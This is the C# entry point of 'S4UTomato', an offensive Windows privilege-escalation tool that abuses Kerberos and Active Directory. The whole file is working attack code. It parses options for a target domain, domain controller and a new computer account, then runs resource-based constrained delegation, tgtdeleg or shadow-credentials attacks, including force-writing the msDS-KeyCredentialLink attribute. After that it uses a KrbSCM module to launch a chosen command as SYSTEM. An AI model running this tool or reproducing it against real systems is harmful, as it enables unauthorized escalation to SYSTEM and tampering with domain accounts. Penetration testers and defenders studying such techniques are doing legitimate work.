using System;
using S4UTomato.Methods;
using S4UTomato.lib.Interop;
using System.Collections.Generic;

using CommandLine;
using CommandLine.Text;

namespace S4UTomato
{
    public class Options
    {
        [Option('d', "Domain", Required = false, HelpText = "Domain (FQDN) to authenticate to.")]
        public string Domain { get; set; }

        [Option('s', "Server", Required = false, HelpText = "Host name of domain controller or LDAP server.")]
        public string Server { get; set; }

        [Option('m', "ComputerName", Required = false, HelpText = "The new computer account to create.")]
        public string ComputerName { get; set; }

        [Option('p', "ComputerPassword", Required = false, HelpText = "The password of the new computer account to be created.")]
        public string ComputerPassword { get; set; }

        [Option('f', "Force", Required = false, HelpText = "Forcefully update the 'msDS-KeyCredentialLink' attribute of the computer object.")]
        public bool Force { get; set; }

        [Option('c', "Command", Required = false, HelpText = "Program to run.")]
        public string Command { get; set; }

        [Option('v', "Verbose", Required = false, HelpText = "Output verbose debug information.")]
        public bool Verbose { get; set; }
    }

    internal class Program
    {
        public static bool wrapTickets = true;
        public static bool Debug = false;
        public static bool Verbose = false;
        static void Main(string[] args)
        {
            var ParserResult = new CommandLine.Parser(with => with.HelpWriter = null)
                .ParseArguments<Options>(args);
            if (args.Length == 0)
            {
                return;
            }
            ParserResult
                .WithParsed(options => Run(args, options))
                .WithNotParsed(errs => DisplayHelp(ParserResult));
        }

        static void DisplayHelp<T>(ParserResult<T> result)
        {
            var helpText = HelpText.AutoBuild(result, h =>
            {
                h.AdditionalNewLineAfterOption = false;
                h.MaximumDisplayWidth = 100;
                h.Heading = "\nS4UTomato 1.0.0-beta"; //change header
                h.Copyright = "Copyright (c) 2023"; //change copyright text
                return HelpText.DefaultParsingErrorsHandler(result, h);
            }, e => e);
            Console.WriteLine(helpText);
        }

        private static void Run(string[] args, Options options)
        {
            string method = args[0];
            string domain = options.Domain;
            string domainController = options.Server;
            string targetComputerName = Environment.MachineName;
            string computerName = options.ComputerName;
            string computerPassword = options.ComputerPassword;
            bool force = options.Force;
            string command = options.Command;
            Verbose = options.Verbose;

            if (String.IsNullOrEmpty(domain))
            {
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name.ToLower();
            }

            if (String.IsNullOrEmpty(domainController))
            {
                domainController = Networking.GetDCName();
            }

            if (!String.IsNullOrEmpty(method))
            {
                if (method == "rbcd")
                {
                    Rbcd.Execute(targetComputerName, domain, domainController, 389, computerName, computerPassword);
                }

                if(method == "tgtdeleg")
                {
                    Tgtdeleg.Execute(domain, domainController);
                    Console.WriteLine("[*] Run the krbscm method for SYSTEM shell");
                    return;
                }

                if (method == "shadowcred")
                {
                    ShadowCredentials.Execute(targetComputerName + "$", domain, domainController, null, force);
                }

                System.Threading.Thread.Sleep(1500);
                //string spawnCommand = $"{System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName} spawn";
                //Helpers.CreateProcessNetOnly(spawnCommand, show: false/*, kirbiBytes: bFinalTicket*/);
                KrbSCM.Execute(command);
            }

            if (method == "krbscm")
            {
                try
                {
                    KrbSCM.Execute(command);
                }
                catch { }
                return;
            }

            if (method == "system")
            {
                try
                {
                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
                }
                catch { }
                return;
            }
        }
    }
}
